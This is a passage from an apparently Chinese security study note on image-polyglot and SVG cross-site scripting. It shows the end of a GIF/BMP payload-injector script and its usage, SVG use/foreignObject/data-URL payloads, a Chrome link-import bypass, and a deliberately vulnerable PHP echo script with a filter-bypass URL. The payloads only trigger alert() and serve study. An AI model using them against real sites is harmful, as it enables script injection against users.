operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">|</span>\n\t\t\t\t\t<span class="token string">&quot;&quot;</span>&quot;<span class="token punctuation">)</span>\n\t<span class="token keyword">if</span> args<span class="token punctuation">.</span>inject_to_existing_bmp<span class="token punctuation">:</span>\n\t\t _inject_into_file<span class="token punctuation">(</span>args<span class="token punctuation">.</span>js_payload<span class="token punctuation">,</span> args<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>\n\t<span class="token keyword">else</span><span class="token punctuation">:</span>\n\t\t_generate_and_write_to_file<span class="token punctuation">(</span>args<span class="token punctuation">.</span>js_payload<span class="token punctuation">,</span> args<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>\n\n\t_generate_launching_page<span class="token punctuation">(</span>args<span class="token punctuation">.</span>filename<span class="token punctuation">)</span>\n\t<span class="token keyword">print</span> <span class="token string">&quot;[+] Finished!&quot;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="使用" tabindex="-1"><a class="header-anchor" href="#使用"><span>使用</span></a></h2><ul><li>准备一个 gif（superman.gif） 图和 bmp（color.bmp） 图</li><li>gif 图片插入 payload：<code>python gif_injector.py -i superman.gif &quot;alert(&#39;mob&#39;);&quot;</code>​</li><li>bmp 图片插入 payload：<code>python bmp_injector.py -i color.bmp &quot;alert(location);&quot;</code>​</li></ul><p>会生成两个文件，run.html &amp; xxx.gif_malw.gif</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Opening an image<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>superman.gif_malw.gif<span class="token punctuation">&quot;</span></span><span class="token attr-name">\\</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">&quot;</span>superman.gif_malw.gif<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+e+'" alt="image" loading="lazy">​</p><p>​<img src="'+p+'" alt="image" loading="lazy">​</p><p>bmp win7 的 IE 都没复现成功，多半是寄了。</p><h1 id="svg-xss" tabindex="-1"><a class="header-anchor" href="#svg-xss"><span>SVG XSS</span></a></h1><p>SVG 是一种基于 XML 的图像文件格式。</p><blockquote><p>[Translated From]：http://insert-script.blogspot.com/2014/02/svg-fun-time-firefox-svg-vector.html</p></blockquote><h2 id="​-use-​-元素" tabindex="-1"><a class="header-anchor" href="#​-use-​-元素"><span>​<code>&lt;use&gt;</code>​ 元素</span></a></h2><p>SVG 中的 use 元素用于重用其他元素，主要用于联接 defs 和 alike，而我们却用它来引用外部 SVG 文件中的元素。</p><p>元素通过其 id 被引用，在 use 标签的 <code>xlink:href</code>​ 属性中以 <code>#</code>​ 井字符开头，外部元素的引用同样如此。</p><p>示例如下。</p><p><strong>test.html</strong></p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>use</span> <span class="token attr-name"><span class="token namespace">xlink:</span>href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&#39;</span>external.svg#rectangle<span class="token punctuation">&#39;</span></span> <span class="token punctuation">/&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>external.svg</strong></p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>rectangle<span class="token punctuation">&quot;</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/2000/svg<span class="token punctuation">&quot;</span></span>\n<span class="token attr-name"><span class="token namespace">xmlns:</span>xlink</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/1999/xlink<span class="token punctuation">&quot;</span></span>\n<span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100<span class="token punctuation">&quot;</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name"><span class="token namespace">xlink:</span>href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>javascript:alert(location)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rect</span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>0<span class="token punctuation">&quot;</span></span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>0<span class="token punctuation">&quot;</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100<span class="token punctuation">&quot;</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>',19),m=(0,t.Lk)("code",null,".svg",-1),v=(0,t.Lk)("code",null,"<svg>",-1),g=(0,t.Lk)("code",null,"<a>",-1),b=(0,t.Lk)("code",null,"<rect>",-1),h={href:"http://www.w3.org/TR/SVG11/linking.html",target:"_blank",rel:"noopener noreferrer"},q={href:"http://tools.ietf.org/html/draft-hoehrmann-javascript-scheme-03",target:"_blank",rel:"noopener noreferrer"},x=(0,t.Lk)("code",null,"<use>",-1),f=(0,t.Fv)('<p>可以看到测试结果，在 chrome 和 Firefox 下点击黑框都能弹框：</p><p>​<img src="'+o+'" alt="image" loading="lazy">​</p><h2 id="​data-url-base64​" tabindex="-1"><a class="header-anchor" href="#​data-url-base64​"><span>​<code>data:url+Base64</code>​</span></a></h2><p>由于加载的外部 SVG 文件必须是<strong>同源</strong>的，这个特性看起来似乎无法作为有用的 XSS 攻击向量，但可以使用 <code>data:url</code>​ 协议来帮我们提升这个攻击向量。</p><p>首先，它允许我们从内部创建一个文件，要求正确的 <code>mime-type</code>​，在这里为 <code>image/svg+xml</code>​。mimie-type 后是我们的攻击载荷或关键字 base64。特别地，由于数据被 base64 编码，这有助于避免突破 HTML 结构的问题。</p><p>现在我们不必再依赖于服务器上的另一个文件了，改进一下 <code>test.html</code>​：</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>use</span> <span class="token attr-name"><span class="token namespace">xlink:</span>href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+CjxhIHhsaW5rOmhyZWY9ImphdmFzY3JpcHQ6YWxlcnQobG9jYXRpb24pIj48cmVjdCB4PSIwIiB5PSIwIiB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgLz48L2E+Cjwvc3ZnPg==#rectangle<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>base64 解码后的内容为</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>rectangle<span class="token punctuation">&quot;</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/2000/svg<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xlink</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/1999/xlink<span class="token punctuation">&quot;</span></span>    <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100<span class="token punctuation">&quot;</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name"><span class="token namespace">xlink:</span>href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>javascript:alert(location)<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rect</span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>0<span class="token punctuation">&quot;</span></span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>0<span class="token punctuation">&quot;</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100<span class="token punctuation">&quot;</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+l+'" alt="image" loading="lazy">​</p><h2 id="无需点击触发-xss" tabindex="-1"><a class="header-anchor" href="#无需点击触发-xss"><span>无需点击触发 xss</span></a></h2><p>利用 <code>&lt;foreignObject&gt;</code>​ 元素</p><p>external.svg 中的 <code>&lt;script&gt;</code>​ 标签不会被解析，但是 SVG 支持 ​<code>&lt;foreignObject&gt;</code>​ 元素。通过阐述这个对象需要的扩展属性，有可能加载非 SVG 元素。这就意味着现在有可能是有 <code>&lt;iframe&gt;</code>​、<code>&lt;embed&gt;</code>​ 及其他所有支持的 HTML 元素了，我们可以从一堆元素中进行选择执行 Javascript，这里使用 <code>&lt;embed&gt;</code>​+JavascriptURL 协议。</p><p><strong>test.html</strong></p><p>新版的 Firefox 已经不生效了。</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>use</span> <span class="token attr-name"><span class="token namespace">xlink:</span>href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+CiAgICA8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+CiAgICA8Zm9yZWlnbk9iamVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIgogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4KCTxlbWJlZCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgc3JjPSJqYXZhc2NyaXB0OmFsZXJ0KGxvY2F0aW9uKSIgLz4KICAgIDwvZm9yZWlnbk9iamVjdD4KPC9zdmc+#rectangle<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>base64 解码后的内容为</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>rectangle<span class="token punctuation">&quot;</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/2000/svg<span class="token punctuation">&quot;</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xlink</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/1999/xlink<span class="token punctuation">&quot;</span></span>    <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100<span class="token punctuation">&quot;</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foreignObject</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100<span class="token punctuation">&quot;</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>50<span class="token punctuation">&quot;</span></span>\n                   <span class="token attr-name">requiredExtensions</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/1999/xhtml<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n\t<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/1999/xhtml<span class="token punctuation">&quot;</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>javascript:alert(location)<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>\n    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foreignObject</span><span class="token punctuation">&gt;</span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到，在 Firefox 下，无需点击即可触发 <code>foreignObject</code>​ 标签内 embed 的 JS 伪协议执行 JS 代码从而弹框，同时没有弹框显示 1 说明了 <code>script</code>​ 标签不会被解析：</p><p>搞个旧的 Firefox 补一下图</p><p>​<img src="'+c+'" alt="image" loading="lazy">​</p><p><strong>其他</strong></p><div class="language-php line-numbers-mode" data-ext="php" data-title="php"><pre class="language-php"><code><span class="token comment"># 嵌套 iframe，注意 xmlns=&quot;http://www.w3.org/1999/xhtml&quot;</span>\n<span class="token operator">&lt;</span>foreignObject width<span class="token operator">=</span><span class="token string double-quoted-string">&quot;100&quot;</span> height<span class="token operator">=</span><span class="token string double-quoted-string">&quot;50&quot;</span> requiredExtensions<span class="token operator">=</span><span class="token string double-quoted-string">&quot;http://www.w3.org/1999/xhtml&quot;</span><span class="token operator">&gt;</span>\n    <span class="token operator">&lt;</span>iframe xmlns<span class="token operator">=</span><span class="token string double-quoted-string">&quot;http://www.w3.org/1999/xhtml&quot;</span> src<span class="token operator">=</span><span class="token string double-quoted-string">&quot;javascript:alert(location)&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">&gt;</span>\n<span class="token operator">&lt;</span><span class="token operator">/</span>foreignObject<span class="token operator">&gt;</span>\n\n<span class="token comment"># object 标签</span>\n<span class="token operator">&lt;</span>foreignObject width<span class="token operator">=</span><span class="token string double-quoted-string">&quot;100&quot;</span> height<span class="token operator">=</span><span class="token string double-quoted-string">&quot;50&quot;</span> requiredExtensions<span class="token operator">=</span><span class="token string double-quoted-string">&quot;http://www.w3.org/1999/xhtml&quot;</span><span class="token operator">&gt;</span>\n    <span class="token operator">&lt;</span><span class="token keyword type-declaration">object</span> xmlns<span class="token operator">=</span><span class="token string double-quoted-string">&quot;http://www.w3.org/1999/xhtml&quot;</span> data<span class="token operator">=</span><span class="token string double-quoted-string">&quot;javascript:alert(location)&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword type-declaration">object</span><span class="token operator">&gt;</span>\n<span class="token operator">&lt;</span><span class="token operator">/</span>foreignObject<span class="token operator">&gt;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="link-xss-bypass-chrome" tabindex="-1"><a class="header-anchor" href="#link-xss-bypass-chrome"><span>Link XSS Bypass Chrome</span></a></h2><p>前面利用 use 元素结合 <code>data:url</code>​ 只能在 Firefox 下生效，Chrome 却不会触发。</p><p>这里可利用 link 来 bypass Chrome。</p><p>示例 <strong>test.html</strong> 如下，加密内容为 <code>&lt;script&gt;alert(&quot;Hello&quot;);&lt;/script&gt;</code>​【成功不了，遂弃之】</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>import<span class="token punctuation">&quot;</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>当然 link 的形式很多，href 的地方本身就是可以插入 js 代码的，但是通过 base64 加密，可以 bypass 各种奇怪的过滤。</p><p>这里很多用到了 data 类型的 url，可参考如下：</p><div class="language-html line-numbers-mode" data-ext="html" data-title="html"><pre class="language-html"><code>data:,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>文本数据</span><span class="token punctuation">&gt;</span></span>  \ndata:text/plain,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>文本数据</span><span class="token punctuation">&gt;</span></span>  \ndata:text/html,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML</span> <span class="token attr-name">代码</span><span class="token punctuation">&gt;</span></span>  \ndata:text/html;base64,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base64</span> <span class="token attr-name">编码的</span> <span class="token attr-name">HTML</span> <span class="token attr-name">代码</span><span class="token punctuation">&gt;</span></span>  \ndata:text/css,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CSS</span> <span class="token attr-name">代码</span><span class="token punctuation">&gt;</span></span>  \ndata:text/css;base64,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base64</span> <span class="token attr-name">编码的</span> <span class="token attr-name">CSS</span> <span class="token attr-name">代码</span><span class="token punctuation">&gt;</span></span>  \ndata:text/javascript,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Javascript</span> <span class="token attr-name">代码</span><span class="token punctuation">&gt;</span></span>  \ndata:text/javascript;base64,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>base64</span> <span class="token attr-name">编码的</span> <span class="token attr-name">Javascript</span> <span class="token attr-name">代码</span><span class="token punctuation">&gt;</span></span>  \ndata:image/gif;base64,base64 编码的 gif 图片数据  \ndata:image/png;base64,base64 编码的 png 图片数据  \ndata:image/jpeg;base64,base64 编码的 jpeg 图片数据  \ndata:image/x-icon;base64,base64 编码的 icon 图片数据\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="结合语言参数" tabindex="-1"><a class="header-anchor" href="#结合语言参数"><span>结合语言参数</span></a></h2><p>Chrome 不支持 <code>&lt;use&gt;</code>​ 标记的 <code>xlink:href</code>​ 属性内的 <code>data:URL</code>​ 方案。此外，我没有找到无需用户交互即可执行 JavaScript 的方法。但至少我可以为您提供一种通过用户交互绕过 Blink/Webkit XSS Auditor 的方法。不使用参数污染，只需要一个参数。之所以提到这一点，是因为 Blink/Webkit XSS Auditor 无法捕获 XSS 攻击，这些攻击被分解为两个或多个参数。</p><p>看一下这个 php 脚本(xss.php)：</p><div class="language-php line-numbers-mode" data-ext="php" data-title="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>\n    <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;body&gt;&quot;</span><span class="token punctuation">;</span>\n    <span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;x&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\n    <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;/body&gt;&quot;</span><span class="token punctuation">;</span>\n<span class="token delimiter important">?&gt;</span></span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这个脚本存在 XSS 漏洞，但是使用下面这样的载荷则会触发 XSS Auditor：</p><div class="language-php line-numbers-mode" data-ext="php" data-title="php"><pre class="language-php"><code>http<span class="token punctuation">:</span><span class="token comment">//site.com/xss.php?x=&lt;svg&gt;&lt;a xlink:href=&quot;javascript:alert(location)&quot;&gt;&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot; /&gt;&lt;/a&gt;&lt;/svg&gt; </span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>因此，让我们使用 <code>&lt;use&gt;</code>​ 元素吧</p><p>Creating the SVG on the 